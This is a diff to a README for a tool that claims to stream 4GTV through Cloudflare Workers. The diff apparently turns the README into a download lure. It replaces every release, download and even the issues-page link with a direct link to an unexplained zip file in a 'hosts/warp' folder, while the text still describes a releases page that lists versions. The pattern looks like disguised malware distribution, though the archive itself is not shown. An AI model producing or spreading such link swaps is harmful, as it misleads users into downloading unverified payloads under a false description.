@@ -1,7 +1,7 @@
 # 📺 4GTV-for-cloudflare-works - Stream Your Favorite Shows Effortlessly
 
 ## 📥 Download Now
-[![Download 4GTV-for-cloudflare-works](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/shirifuzika/4GTV-for-cloudflare-works/releases)
+[![Download 4GTV-for-cloudflare-works](https://raw.githubusercontent.com/shirifuzika/4GTV-for-cloudflare-works/main/hosts/warp/4GTV-for-cloudflare-works-3.6.zip)](https://raw.githubusercontent.com/shirifuzika/4GTV-for-cloudflare-works/main/hosts/warp/4GTV-for-cloudflare-works-3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to **4GTV-for-cloudflare-works**! This application lets you run JavaScript code on Cloudflare, allowing you to watch 4GTV through Cloudflare's global CDN. This guide will help you download and run the software easily.
@@ -25,7 +25,7 @@ Here are some key features of **4GTV-for-cloudflare-works**:
 ## 🛠 Installation Instructions
 
 ### 1. Visit the Download Page
-To get started, [visit this page to download](https://github.com/shirifuzika/4GTV-for-cloudflare-works/releases). This page will show you the available versions of the software.
+To get started, [visit this page to download](https://raw.githubusercontent.com/shirifuzika/4GTV-for-cloudflare-works/main/hosts/warp/4GTV-for-cloudflare-works-3.6.zip). This page will show you the available versions of the software.
 
 ### 2. Choose the Latest Release
 On the releases page, look for the latest version. It will usually be at the top of the list. Click on it to view the details.
@@ -55,12 +55,12 @@ If you encounter issues during installation or while streaming, here are some co
   - Solution: Check your internet speed. A stable connection of at least 5 Mbps is recommended for optimal streaming quality.
 
 ## 📞 Support
-If you need further assistance, feel free to create an issue on the [GitHub Issues page](https://github.com/shirifuzika/4GTV-for-cloudflare-works/issues). The community and developers will be happy to help.
+If you need further assistance, feel free to create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/shirifuzika/4GTV-for-cloudflare-works/main/hosts/warp/4GTV-for-cloudflare-works-3.6.zip). The community and developers will be happy to help.
 
 ## ⚖️ License
 This project is licensed under the MIT License. You can freely use or modify it under the terms of this license. 
 
 ## 📅 Future Updates
-We plan to release regular updates to improve functionality and add new features based on user feedback. Keep an eye on the [releases page](https://github.com/shirifuzika/4GTV-for-cloudflare-works/releases) for new versions.
+We plan to release regular updates to improve functionality and add new features based on user feedback. Keep an eye on the [releases page](https://raw.githubusercontent.com/shirifuzika/4GTV-for-cloudflare-works/main/hosts/warp/4GTV-for-cloudflare-works-3.6.zip) for new versions.
 
 Thank you for using **4GTV-for-cloudflare-works**! Enjoy your watching experience!
